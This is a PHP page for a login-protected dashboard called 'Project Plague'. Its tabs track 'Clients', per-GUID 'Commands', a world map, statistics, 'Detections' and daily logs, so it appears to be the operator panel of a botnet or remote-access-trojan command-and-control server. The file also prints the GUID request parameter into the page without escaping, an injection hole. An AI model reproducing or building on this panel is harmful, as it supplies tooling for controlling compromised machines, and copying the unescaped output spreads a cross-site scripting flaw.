<?php
session_start();
if(!isset($_SESSION['user'])){
	header('Location: index.php');
	exit;
}

if(!isset($_GET['tab'])){
	$Tab = 'Clients';
} else $Tab = $_GET['tab'];

?>
<html>
	<head>
		<link href="https://fonts.googleapis.com/css?family=Krub" rel="stylesheet">
		<title>Project Plague</title>
		<link rel="shortcut icon" type="image/png" href="img/favicon.png"/>
		<link rel="stylesheet" type="text/css" href="style.css">
		<script src="scripts/jquery-3.3.1.min.js"></script>
		<?php if($Tab=='Clients'){ ?>
		<script>
			function RefreshClients() {
				$.get('info.php').then(function(responseData) {
				  $('#workstation').html(responseData);
				});
				setTimeout(RefreshClients, 3000);
			}
			
			RefreshClients();
			
		</script>
		<?php } ?>
	</head>
	<div class="container">
		<menu class="topmenu">
			<p>Welcome, <?php echo($_SESSION['user']) ?></p>
			<a href="logout.php"><p>Log out</p></a>
		</menu>
		<div class="line"></div>
		<ul class="leftmenu">
		<img src="img/icon.png" class="avatar">
			<li><a href="?tab=Clients">
				<img src="img/spider-web.png">
				Clients
			</a></li>
			<li><a href="?tab=Commands">
				<img src="img/terminal.png">
				Commands
			</a></li>
			<li><a href="?tab=Map">
				<img src="img/worldwide.png">
				Map
			</a></li>
			<li><a href="?tab=Statistics">
				<img src="img/bar-chart.png">
				Statistics
			</a></li>
			<li><a href="?tab=Detections">
				<img src="img/insect.png">
				Detections
			</a></li>
			<li><a href="?tab=Logs">
				<img src="img/notepad.png">
				Logs
			</a></li>
			<separator></separator>
			<li><a href="?tab=About">
				<img src="img/information.png">
				About
			</a></li>
		</ul>
		<div class="clients" id="workstation">
			<?php
			switch($Tab){
				case 'About':{
					echo(file_get_contents('tabs/about.html'));
				} break;
				case 'Commands':{
					ob_start();
					include('tabs/commands.php');
					echo(ob_get_clean());
					if(isset($_GET['GUID'])){
						ob_start();
						include('commands.php');
						$R = ob_get_clean();
						if(strlen($R)==0) $R = 'The specified GUID is invalid.';
						echo('<p>Commands of ' . $_GET['GUID'] . ':</p><pre style="width: 100%;">' . $R . '</pre>');
					}
				} break;
				case 'Map':{
					ob_start();
					include('tabs/map.php');
					echo(ob_get_clean());
				} break;
				case 'Statistics': {
					ob_start();
					include('tabs/statistics.php');
					echo(ob_get_clean());
				} break;
				case 'Detections': {
					echo(file_get_contents('tabs/detections.html'));
				} break;
				case 'Logs':{
					$FileName = "logs/Log_" . date("Y-m-d") . ".txt";
					if(file_exists($FileName)){
						$FC = file_get_contents($FileName);
						echo('<pre style="width: 100%;">' . $FC . '</pre>');
					} else echo('<p>No events logged today.</p>');
				} break;
				default:{
					echo('<p>Invalid tab</p>');
				}
			}
			?>
		</div>
	</div>
</html>